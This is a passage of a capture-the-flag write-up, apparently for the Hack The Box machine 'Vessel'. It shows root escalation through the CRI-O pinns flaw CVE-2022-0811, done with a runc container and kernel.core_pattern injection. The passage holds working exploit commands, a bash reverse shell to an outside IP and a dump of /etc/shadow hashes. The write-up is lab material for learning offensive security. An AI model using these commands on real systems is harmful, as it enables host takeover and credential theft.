<p>Read the PDF and we find System Administrator <code>ethan</code>’s password - <code>b@mPRNSVTjjLKId1T</code></p>
<p><img src="images/vessel12.png" class="img-fluid"></p>
<p>Login with SSH and grab <code>user.txt</code></p>
<div class="sourceCode" id="cb31"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel ssh ethan@vessel.htb </span>
<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel.htb</span> password: b@mPRNSVTjjLKId1T</span>
<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:~$</span> id <span class="kw">&amp;&amp;</span> <span class="fu">hostname</span> <span class="kw">&amp;&amp;</span> <span class="fu">cat</span> user.txt </span>
<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">ethan</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">ethan</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">ethan</span><span class="kw">)</span></span>
<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a><span class="ex">vessel</span></span>
<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a><span class="ex">608191af90716a518c1483138b0b1ded</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>Some quick manual enumeration as user <code>ethan</code> and we find..</p>
<p>.. we’re unable to run anything as <code>root</code>:</p>
<div class="sourceCode" id="cb32"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:~$</span> sudo <span class="at">-l</span></span>
<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[sudo]</span> password for ethan: </span>
<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Sorry,</span> user ethan may not run sudo on vessel.</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>.. nothing of use in <code>/opt</code>, <code>/tmp</code> or <code>/dev/shm</code></p>
<p>.. no unknown service running locally:</p>
<div class="sourceCode" id="cb33"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:~$</span> netstat <span class="at">-tulpn</span></span>
<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">Not</span> all processes could be identified, non-owned process info</span>
<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a> <span class="ex">will</span> not be shown, you would have to be root to see it all.<span class="kw">)</span></span>
<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Active</span> Internet connections <span class="er">(</span><span class="ex">only</span> servers<span class="kw">)</span></span>
<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span>
<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:33060         0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:3306          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.53:53           0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                                   </span>
<span id="cb33-9"><a href="#cb33-9" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:8000          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>   </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>.. we are not part of any strange/interesting groups:</p>
<div class="sourceCode" id="cb34"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:~$</span> id</span>
<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">ethan</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">ethan</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">ethan</span><span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>.. interesting objects owned by group <code>ethan</code>:</p>
<div class="sourceCode" id="cb35"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/$</span> find / <span class="at">-group</span> ethan <span class="dv">2</span><span class="op">&gt;</span> /dev/null</span>
<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/pinns</span></span>
<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/$</span> ls <span class="at">-al</span> /usr/bin/pinns</span>
<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwsr-x---</span> 1 root ethan 814936 Mar 15 18:18 /usr/bin/pinns</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><code>/usr/bin/pinns</code> have the SUID bit set and is most likely our path to root, lets investigate more.</p>
<div class="sourceCode" id="cb36"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/$</span> /usr/bin/pinns</span>
<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[pinns:e]:</span> Path for pinning namespaces not specified: Invalid argument</span>
<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/$</span> /usr/bin/pinns <span class="at">--help</span></span>
<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/$</span> /usr/bin/pinns <span class="at">-h</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Googling for <em>“Path for pinning namespaces”</em> we get two matches, both referencing <strong>CRI-O</strong>.</p>
<p><img src="images/vessel13.png" class="img-fluid"></p>
<p><em>“CRI-O is&nbsp;<strong>an implementation of the Kubernetes CRI (Container Runtime Interface) to enable using OCI (Open Container Initiative) compatible runtimes</strong>. It is a lightweight alternative to using Docker as the runtime for kubernetes.”</em></p>
<p>Google <em>cri-o “pinns”</em> and the first article we find is one from CrowdStrike disclosing a vulnerability in CRI-O, <a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">CVE-2022-0811</a>. Some key information from the article:</p>
<ul>
<li><p><em>“Dubbed “cr8escape,” when invoked, an attacker could escape from a Kubernetes container and gain root access to the host and be able to move anywhere in the cluster.”</em></p></li>
<li><p><em>“.. discovered a flaw introduced in CRI-O version&nbsp;<a href="https://github.com/cri-o/cri-o/tree/v1.19.0/pinns/src">1.19</a>&nbsp;that allows an attacker to bypass these safeguards and set arbitrary kernel parameters on the host.”</em></p></li>
<li><p><em>“..&nbsp;anyone with rights to deploy a pod on a Kubernetes cluster that uses the CRI-O runtime can abuse the “<a href="https://man7.org/linux/man-pages/man5/core.5.html">kernel.core_pattern</a>” parameter to achieve container escape and arbitrary code execution as root on any node in the cluster.”</em></p></li>
<li><p>A PoC on how to exploit this vulnerability with <code>kubectl</code></p></li>
</ul>
<div class="sourceCode" id="cb37"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/$</span> crio <span class="at">--version</span></span>
<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="ex">crio</span> version 1.19.6</span>
<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Version:</span>       1.19.6</span>
<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a><span class="ex">GitCommit:</span>     c12bb210e9888cf6160134c7e636ee952c45c05a</span>
<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a><span class="ex">GitTreeState:</span>  clean</span>
<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a><span class="ex">BuildDate:</span>     2022-03-15T18:18:24Z</span>
<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a><span class="ex">GoVersion:</span>     go1.15.2</span>
<span id="cb37-8"><a href="#cb37-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Compiler:</span>      gc</span>
<span id="cb37-9"><a href="#cb37-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Platform:</span>      linux/amd64</span>
<span id="cb37-10"><a href="#cb37-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Linkmode:</span>      dynamic</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We’ve most definitely found the start towards root.</p>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>Reading about the exploit we should (1) create a pod/container, (2) use <code>pinns</code> to exploit the vulnerable variable <code>kernel.core_pattern</code>, (3) trigger a core dump and then reap the rewards</p>
<p>This is all easy in theory, but we don’t have <code>kubectl</code>, <code>minikube</code> or <code>docker</code> available. However we do have <code>runc</code>! <strong>(1)</strong> Follow the steps on <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation">HackTricks</a> to create a container.</p>
<div class="sourceCode" id="cb38"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="co">## Create location for runc filesystem</span></span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/$</span> mkdir /tmp/pthree</span>
<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/$</span> mkdir /tmp/pthree/rootfs</span>
<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a><span class="co">## Create runc configuration</span></span>
<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/tmp/pthree$</span> runc spec</span>
<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a><span class="co">## Add following data under 'mounts' section of config.json</span></span>
<span id="cb38-9"><a href="#cb38-9" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span></span>
<span id="cb38-10"><a href="#cb38-10" aria-hidden="true" tabindex="-1"></a><span class="st">"type"</span><span class="ex">:</span> <span class="st">"bind"</span>,</span>
<span id="cb38-11"><a href="#cb38-11" aria-hidden="true" tabindex="-1"></a><span class="st">"source"</span><span class="ex">:</span> <span class="st">"/"</span>,</span>
<span id="cb38-12"><a href="#cb38-12" aria-hidden="true" tabindex="-1"></a><span class="st">"destination"</span><span class="ex">:</span> <span class="st">"/"</span>,</span>
<span id="cb38-13"><a href="#cb38-13" aria-hidden="true" tabindex="-1"></a><span class="st">"options"</span><span class="ex">:</span> [</span>
<span id="cb38-14"><a href="#cb38-14" aria-hidden="true" tabindex="-1"></a><span class="st">"rbind"</span><span class="ex">,</span></span>
<span id="cb38-15"><a href="#cb38-15" aria-hidden="true" tabindex="-1"></a><span class="st">"rw"</span><span class="ex">,</span></span>
<span id="cb38-16"><a href="#cb38-16" aria-hidden="true" tabindex="-1"></a><span class="st">"rprivate"</span></span>
<span id="cb38-17"><a href="#cb38-17" aria-hidden="true" tabindex="-1"></a><span class="ex">]</span></span>
<span id="cb38-18"><a href="#cb38-18" aria-hidden="true" tabindex="-1"></a><span class="ex">},</span></span>
<span id="cb38-19"><a href="#cb38-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-20"><a href="#cb38-20" aria-hidden="true" tabindex="-1"></a><span class="co">## Start runc</span></span>
<span id="cb38-21"><a href="#cb38-21" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/tmp/pthree$</span> runc run privesc</span>
<span id="cb38-22"><a href="#cb38-22" aria-hidden="true" tabindex="-1"></a><span class="va">ERRO</span><span class="op">[</span><span class="dv">0000</span><span class="op">]</span> <span class="ex">runc</span> run failed: rootless container requires user namespaces</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Reading about this I find a <a href="https://github.com/opencontainers/runc/issues/1782">GitHub Issue</a> stating that generating the default spec using <code>run spec --rootless</code> will solve the problem, so remove everything and try again.</p>
<div class="sourceCode" id="cb39"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/tmp/pthree$</span> rm <span class="at">-rf</span> <span class="pp">*</span></span>
<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/tmp/pthree$</span> runc spec <span class="at">--rootless</span></span>
<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/tmp/pthree$</span> mkdir rootfs</span>
<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/tmp/pthree$</span> vim config.json </span>
<span id="cb39-5"><a href="#cb39-5" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/tmp/pthree$</span> runc run privesc</span>
<span id="cb39-6"><a href="#cb39-6" aria-hidden="true" tabindex="-1"></a><span class="co"># hostname</span></span>
<span id="cb39-7"><a href="#cb39-7" aria-hidden="true" tabindex="-1"></a><span class="ex">runc</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Great, we got a container! <strong>(2)</strong> Open a second terminal and write a simple PoC script to be executed</p>
<div class="sourceCode" id="cb40"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/tmp$</span> cat poc </span>
<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/sh</span></span>
<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span> <span class="op">&gt;&gt;</span> /tmp/out</span>
<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a><span class="fu">hostname</span> <span class="op">&gt;&gt;</span> /tmp/out</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>From the second terminal run the malicious <code>pinns</code> command, I found this great <a href="https://www.wangan.com/p/7fy7f3b1e4c81b1f">Chinese post</a> showcasing this.</p>
<div class="sourceCode" id="cb41"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/tmp$</span> /usr/bin/pinns <span class="at">-d</span> /tmp/pthree <span class="at">-f</span> privesc <span class="at">-s</span> <span class="st">'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/poc #'</span>--ipc <span class="at">--net</span> <span class="at">--uts</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We can verify that <code>netns</code> and <code>utsns</code> are created in <code>/tmp/pthree</code> from the container:</p>
<div class="sourceCode" id="cb42"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="co"># ls -al /tmp/pthree</span></span>
<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 24</span>
<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>  5 root   root    4096 Sep  2 09:07 .</span>
<span id="cb42-4"><a href="#cb42-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxrwt</span> 17 nobody nogroup 4096 Sep  2 09:03 ..</span>
<span id="cb42-5"><a href="#cb42-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-rw-r--</span>  1 root   root    2893 Sep  2 08:59 config.json</span>
<span id="cb42-6"><a href="#cb42-6" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>  2 nobody root    4096 Sep  2 09:07 netns</span>
<span id="cb42-7"><a href="#cb42-7" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>  2 root   root    4096 Sep  2 08:58 rootfs</span>
<span id="cb42-8"><a href="#cb42-8" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>  2 nobody root    4096 Sep  2 09:07 utsns</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>(3)</strong> In the first terminal (runc container) trigger a core dump to run the script.</p>
<div class="sourceCode" id="cb43"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@runc:/#</span> ulimit <span class="at">-c</span> unlimited</span>
<span id="cb43-2"><a href="#cb43-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@runc:/#</span> tail <span class="at">-f</span> /dev/null <span class="kw">&amp;</span></span>
<span id="cb43-3"><a href="#cb43-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[1]</span> 32</span>
<span id="cb43-4"><a href="#cb43-4" aria-hidden="true" tabindex="-1"></a><span class="ex">root@runc:/#</span> kill <span class="at">-SIGSEGV</span> 32</span>
<span id="cb43-5"><a href="#cb43-5" aria-hidden="true" tabindex="-1"></a><span class="ex">root@runc:/#</span> ps</span>
<span id="cb43-6"><a href="#cb43-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PID</span> TTY          TIME CMD</span>
<span id="cb43-7"><a href="#cb43-7" aria-hidden="true" tabindex="-1"></a>      <span class="ex">1</span> pts/0    00:00:00 sh</span>
<span id="cb43-8"><a href="#cb43-8" aria-hidden="true" tabindex="-1"></a>     <span class="ex">18</span> pts/0    00:00:00 bash</span>
<span id="cb43-9"><a href="#cb43-9" aria-hidden="true" tabindex="-1"></a>     <span class="ex">33</span> pts/0    00:00:00 ps</span>
<span id="cb43-10"><a href="#cb43-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[1]+</span>  Segmentation fault      <span class="er">(</span><span class="ex">core</span> dumped<span class="kw">)</span> <span class="fu">tail</span> <span class="at">-f</span> /dev/null</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Reap the rewards from the script:</p>
<div class="sourceCode" id="cb44"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/tmp/pthree$</span> cat /tmp/out </span>
<span id="cb44-2"><a href="#cb44-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root</span></span>
<span id="cb44-3"><a href="#cb44-3" aria-hidden="true" tabindex="-1"></a><span class="ex">vessel</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="step-3-1" class="level3">
<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
<p>The PoC works as intended, weaponize to gain a root shell however you like. Myself, I’d like to try the payload posted in the <a href="https://www.wangan.com/p/7fy7f3b1e4c81b1f">Chinese post</a>.</p>
<div class="sourceCode" id="cb45"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan@vessel:/tmp/pthree$</span> /usr/bin/pinns <span class="at">-d</span> /tmp/pthree <span class="at">-f</span> privesc1337 <span class="at">-s</span> <span class="st">'kernel.shm_rmid_forced=1+kernel.core_pattern=|/bin/bash -c "$@" -- eval /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.16/4488 0&gt;&amp;1 #'</span>--ipc <span class="at">--net</span> <span class="at">--uts</span></span>
<span id="cb45-2"><a href="#cb45-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb45-3"><a href="#cb45-3" aria-hidden="true" tabindex="-1"></a><span class="ex">root@runc:/#</span> ulimit <span class="at">-c</span> unlimited</span>
<span id="cb45-4"><a href="#cb45-4" aria-hidden="true" tabindex="-1"></a><span class="ex">root@runc:/#</span> tail <span class="at">-f</span> /dev/null <span class="kw">&amp;</span></span>
<span id="cb45-5"><a href="#cb45-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[1]</span> 34</span>
<span id="cb45-6"><a href="#cb45-6" aria-hidden="true" tabindex="-1"></a><span class="ex">root@runc:/#</span> kill <span class="at">-SIGSEGV</span> 34</span>
<span id="cb45-7"><a href="#cb45-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb45-8"><a href="#cb45-8" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel nc <span class="at">-lvnp</span> 4488</span>
<span id="cb45-9"><a href="#cb45-9" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4488 ...</span>
<span id="cb45-10"><a href="#cb45-10" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.16</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.178]</span> 49816</span>
<span id="cb45-11"><a href="#cb45-11" aria-hidden="true" tabindex="-1"></a><span class="ex">root@vessel:/#</span> id <span class="kw">&amp;&amp;</span> <span class="fu">hostname</span></span>
<span id="cb45-12"><a href="#cb45-12" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span></span>
<span id="cb45-13"><a href="#cb45-13" aria-hidden="true" tabindex="-1"></a><span class="ex">vessel</span></span>
<span id="cb45-14"><a href="#cb45-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb45-15"><a href="#cb45-15" aria-hidden="true" tabindex="-1"></a><span class="ex">root@vessel:/#</span> cat /root/root.txt</span>
<span id="cb45-16"><a href="#cb45-16" aria-hidden="true" tabindex="-1"></a><span class="ex">86dad527504c8042c21914394acb7115</span></span>
<span id="cb45-17"><a href="#cb45-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb45-18"><a href="#cb45-18" aria-hidden="true" tabindex="-1"></a><span class="ex">root@vessel:/#</span> cat /etc/shadow</span>
<span id="cb45-19"><a href="#cb45-19" aria-hidden="true" tabindex="-1"></a><span class="ex">root:</span><span class="va">$6$9</span><span class="ex">AU197eAAajcv6DO</span><span class="va">$YOGX5f111bLxtIqVgPKGg3QmWiWIRVmYk3Gkj0BwFVb9K0BkAnJEHaRJElahiQGxtDnvjPI9XqPMkI7YrE60A1</span><span class="ex">:19101:0:99999:7:::</span></span>
<span id="cb45-20"><a href="#cb45-20" aria-hidden="true" tabindex="-1"></a><span class="ex">ethan:</span><span class="va">$6$7</span><span class="ex">ZmNCkavGVnqDtRI</span><span class="va">$DXwHR</span><span class="ex">.p1AXlIwDsoi20wpd57ZQL4doguuNxh4XY.vzX8wwnD8uz5Gz2AG6tWDEDfsO8CQFOYgEHg/riNHOJ4k0:19099:0:99999:7:::</span></span>
<span id="cb45-21"><a href="#cb45-21" aria-hidden="true" tabindex="-1"></a><span class="ex">steven:</span><span class="va">$6$Czg9</span><span class="ex">.c1hcgYo7ON4</span><span class="va">$ogez7L7bCGFTURA4LcPv8A5CWdGufpkI4QHhSfKtZUMq2vzT7hKP</span><span class="ex">/.DSDRXSQBWzgvVTnIpY/jG.zYFIgWFXD.:19099:0:99999:7:::</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>


</section>
</section>

</main> <!-- /main -->
<script id="quarto-html-after-body" type="application/javascript">
  window.document.addEventListener("DOMContentLoaded", function (event) {
    const icon = "";
    const anchorJS = new window.AnchorJS();
    anchorJS.options = {
      placement: 'right',
      icon: icon
    };
    anchorJS.add('.anchored');
    const isCodeAnnotation = (el) => {
      for (const clz of el.classList) {
        if (clz.startsWith('code-annotation-')) {                     
          return true;
        }
      }
      return false;
    }
    const onCopySuccess = function(e) {
      // button target
      const button = e.trigger;
      // don't keep focus
      button.blur();
      // flash "checked"
      button.classList.add('code-copy-button-checked');
      var currentTitle = button.getAttribute("title");
      button.setAttribute("title", "Copied!");
      let tooltip;
      if (window.bootstrap) {
        button.setAttribute("data-bs-toggle", "tooltip");
        button.setAttribute("data-bs-placement", "left");
        button.setAttribute("data-bs-title", "Copied!");
        tooltip = new bootstrap.Tooltip(button, 
          { trigger: "manual", 
            customClass: "code-copy-button-tooltip",
            offset: [0, -8]});
        tooltip.show();    
      }
      setTimeout(function() {
        if (tooltip) {
          tooltip.hide();
          button.removeAttribute("data-bs-title");
          button.removeAttribute("data-bs-toggle");
          button.removeAttribute("data-bs-placement");
        }
        button.setAttribute("title", currentTitle);
        button.classList.remove('code-copy-button-checked');
      }, 1000);
      // clear code selection
      e.clearSelection();
    }
    const getTextToCopy = function(trigger) {
        const codeEl = trigger.previousElementSibling.cloneNode(true);
        for (const childEl of codeEl.children) {
          if (isCodeAnnotation(childEl)) {
            childEl.remove();
          }
        }
        return codeEl.innerText;
    }
    const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
      text: getTextToCopy
    });
    clipboard.on('success', onCopySuccess);
    if (window.document.getElementById('quarto-embedded-source-code-modal')) {
      const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
        text: getTextToCopy,
        container: window.document.getElementById('quarto-embedded-source-code-modal')
      });
      clipboardModal.on('success', onCopySuccess);
    }
      var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
      var mailtoRegex = new RegExp(/^mailto:/);
        var filterRegex = new RegExp("https:\/\/exploit\.se");
      var isInternal = (href) => {
          return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
      }
      // Inspect non-navigation links and adorn them if external
     var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
      for (var i=0; i<links.length; i++) {
        const link = links[i];
        if (!isInternal(link.href)) {
          // undo the damage that might have been done by quarto-nav.js in the case of
          // links that we want to consider external
          if (link.dataset.originalHref !== undefined) {
            link.href = link.dataset.originalHref;
          }
        }
      }
    function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
      const config = {
        allowHTML: true,
        maxWidth: 500,
        delay: 100,
        arrow: false,
        appendTo: function(el) {
            return el.parentElement;
        },
        interactive: true,
        interactiveBorder: 10,
        theme: 'quarto',
        placement: 'bottom-start',
      };
      if (contentFn) {
        config.content = contentFn;
      }
      if (onTriggerFn) {
        config.onTrigger = onTriggerFn;
      }
      if (onUntriggerFn) {
        config.onUntrigger = onUntriggerFn;
      }
      window.tippy(el, config); 
    }
    const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
    for (var i=0; i<noterefs.length; i++) {
      const ref = noterefs[i];
      tippyHover(ref, function() {
        // use id or data attribute instead here
        let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
        try { href = new URL(href).hash; } catch {}
        const id = href.replace(/^#\/?/, "");
        const note = window.document.getElementById(id);
        if (note) {
          return note.innerHTML;
        } else {
          return "";
        }
      });
    }
    const xrefs = window.document.querySelectorAll('a.quarto-xref');
    const processXRef = (id, note) => {
      // Strip column container classes
      const stripColumnClz = (el) => {
        el.classList.remove("page-full", "page-columns");
        if (el.children) {
          for (const child of el.children) {
            stripColumnClz(child);
          }
        }
      }
